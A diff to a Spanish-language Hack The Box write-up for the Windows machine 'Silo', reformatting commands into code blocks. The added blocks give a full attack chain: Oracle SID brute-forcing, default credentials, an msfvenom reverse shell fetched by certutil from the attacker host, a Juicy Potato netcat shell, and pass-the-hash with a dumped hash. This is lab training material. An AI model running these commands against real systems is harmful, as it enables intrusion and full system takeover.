@@ -2,7 +2,7 @@
 
 | Característica | Descripción |
 |---|---|
-| Nombre | [Active](https://www.hackthebox.com/home/machines/profile/131) |
+| Nombre | [Silo](https://www.hackthebox.com/home/machines/profile/131) |
 | OS | Windows |
 | Dificultad oficial | Medium |
 | Dificultad de comunidad | ![Dificultad](images/difficulty.png) |
@@ -131,7 +131,13 @@ Posteriormente, en la metodología se mencionan los SID (Identificadores de Serv
 
 #### hydra
 
-Haciendo uso de `hydra -L content/sids-oracle.txt -s 1521 10.10.10.82 oracle-sid` con el conjunto de diccionarios que ofrece [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener#what-is-a-sid) (el cual es un compendio de las listas de nmap y metasploit), se identificaron los SIDs:
+Haciendo uso de:
+
+```bash
+hydra -L content/sids-oracle.txt -s 1521 10.10.10.82 oracle-sid
+```
+
+Con el conjunto de diccionarios que ofrece [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener#what-is-a-sid) (el cual es un compendio de las listas de nmap y metasploit), se identificaron los SIDs:
 
 - CLRExtProc.
 - PLSExtProc.
@@ -153,7 +159,11 @@ Haciendo uso de [ODAT](https://github.com/quentinhardy/odat) se obtuvieron crede
 
 #### Ejecución
 
-Como parte inicial se ejecutó un "Ave María" invocando todos los módulos que la herramienta ofrece para visualizar si de esta manera se identificaba algo que pudiera servir, para ello, la herramienta solicita un SID válido a ocupar, siendo `XE` el SID con información útil (identificándolo después de ejecutar el comando con cada uno de los SIDs). Haciendo uso de `./odat.py all -s 10.10.10.82 -p 1521 -d XE`.
+Como parte inicial se ejecutó un "Ave María" invocando todos los módulos que la herramienta ofrece para visualizar si de esta manera se identificaba algo que pudiera servir, para ello, la herramienta solicita un SID válido a ocupar, siendo `XE` el SID con información útil (identificándolo después de ejecutar el comando con cada uno de los SIDs). Haciendo uso de:
+
+```bash
+./odat.py all -s 10.10.10.82 -p 1521 -d XE
+```
 
 ![Obtención de credenciales](images/exploit_1.png)
 
@@ -169,9 +179,23 @@ Posteriormente, al revisar los módulos disponibles se identificó que tanto el 
 
 Obteniendo así, una vez ejecutada la reverse shell, acceso directamente como administrador.
 
-1. Creando un payload con `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=1234 -f exe > pwn.exe`.
-2. Descargándolo con `./odat.py dbmsscheduler -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --exec "certutil.exe -f -urlcache -split http://10.10.14.16/pwn.exe c:\windows\temp\pwn.exe" --sysdba`.
-3. Y ejecutándolo con `./odat.py externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --exec "c:\windows\temp" "pwn.exe" --sysdba`.
+1. Creando un payload con:
+   
+   ```bash
+   msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=1234 -f exe > pwn.exe
+   ```
+
+2. Descargándolo con:
+   
+   ```bash
+   ./odat.py dbmsscheduler -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --exec "certutil.exe -f -urlcache -split http://10.10.14.16/pwn.exe c:\windows\temp\pwn.exe" --sysdba
+   ```
+
+3. Y ejecutándolo con:
+   
+   ```bash
+   ./odat.py externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --exec "c:\windows\temp" "pwn.exe" --sysdba
+   ```
 
 ![Reverse shell](images/exploit_2.png)
 
@@ -187,7 +211,11 @@ Si bien odat permite la lectura, escritura y ejecución de archivos, todo lo que
 
 Como parte de la [instalación de odat](https://github.com/quentinhardy/odat#installation-optional-for-development-version), se realiza la instalación del cliente sql para conectarse a la base de datos de Oracle.
 
-Por lo que una vez instalado se permite la conexión al host por medio de `sqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba`.
+Por lo que una vez instalado se permite la conexión al host por medio de:
+
+```bash
+sqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba
+```
 
 ![Conexión con cliente Oracle](images/exploit_3.png)
 
@@ -270,9 +298,11 @@ link password:
 
 ### Método 1 - Juicy Potato
 
-Habiendo encontrado los privilegios relacionados con este método de escalación, sólo restaría probar su ejecución mediante el [binario](https://github.com/ohpe/juicy-potato/releases) y con las opciones utilizadas para entablar una reverse shell con permisos elevados `NT AUTHORITY\SYSTEM`.
+Habiendo encontrado los privilegios relacionados con este método de escalación, sólo restaría probar su ejecución mediante el [binario](https://github.com/ohpe/juicy-potato/releases) y con las opciones utilizadas para entablar una reverse shell con permisos elevados `NT AUTHORITY\SYSTEM`. Ejecutando:
 
-`.\jp.exe -t * -l 1337 -p c:\windows\temp\nc.exe -a " -e cmd.exe 10.10.14.16 4321"`
+```bash
+.\jp.exe -t * -l 1337 -p c:\windows\temp\nc.exe -a " -e cmd.exe 10.10.14.16 4321"
+```
 
 ![Ejecución de Juicy Potato](images/post_3.png)
 
@@ -284,7 +314,13 @@ Con lo que respecta a la práctica los argumentos `-t` y `-l` no representa algo
 
 ### Método 2 - Memdump
 
-Con la copia de memoria descargada, se puede hacer uso de [volatility](https://www.volatilityfoundation.org/releases) para analizarla. Buscando antes que todo un perfil acorde al perteneciente al dumpeo de memoria, por medio de `./volatility_2.6_lin64_standalone -f /home/srrequiem/Documents/htb/windows/medium/silo/content/SILO-20180105-221806.dmp imageinfo` teniendo en cuenta que debido al acceso previamente obtenido se puede buscar un perfil más adecuado.
+Con la copia de memoria descargada, se puede hacer uso de [volatility](https://www.volatilityfoundation.org/releases) para analizarla. Buscando antes que todo un perfil acorde al perteneciente al dumpeo de memoria, por medio de:
+
+```bash
+./volatility_2.6_lin64_standalone -f /home/srrequiem/Documents/htb/windows/medium/silo/content/SILO-20180105-221806.dmp imageinfo
+```
+
+Teniendo en cuenta que debido al acceso previamente obtenido se puede buscar un perfil más adecuado.
 
 ![Perfiles sugeridos](images/post_5.png)
 
@@ -292,11 +328,19 @@ Ejecutando `systeminfo` en la máquina se pueden comparar resultados, identifica
 
 ![Información de sistema](images/post_6.png)
 
-Haciendo uso del plugin `hashdump` se pueden obtener los hashes del sistema, exponiendo de esta manera una forma de acceder a la máquina como el usuario Administrator. Por medio de `./volatility_2.6_lin64_standalone -f /home/srrequiem/Documents/htb/windows/medium/silo/content/SILO-20180105-221806.dmp --profile=Win2012R2x64 hashdump`.
+Haciendo uso del plugin `hashdump` se pueden obtener los hashes del sistema, exponiendo de esta manera una forma de acceder a la máquina como el usuario Administrator. Por medio de:
+
+```bash
+./volatility_2.6_lin64_standalone -f /home/srrequiem/Documents/htb/windows/medium/silo/content/SILO-20180105-221806.dmp --profile=Win2012R2x64 hashdump
+```
 
 ![Obtención de hashes](images/post_7.png)
 
-Obteniendo acceso haciendo uso del hash con `impacket-psexec Administrator@10.10.10.82 -hashes :9e730375b7cbcebf74ae46481e07b0c7`.
+Obteniendo acceso haciendo uso del hash con:
+
+```bash
+impacket-psexec Administrator@10.10.10.82 -hashes :9e730375b7cbcebf74ae46481e07b0c7
+```
 
 ![Acceso como Administrator](images/post_8.png)
 
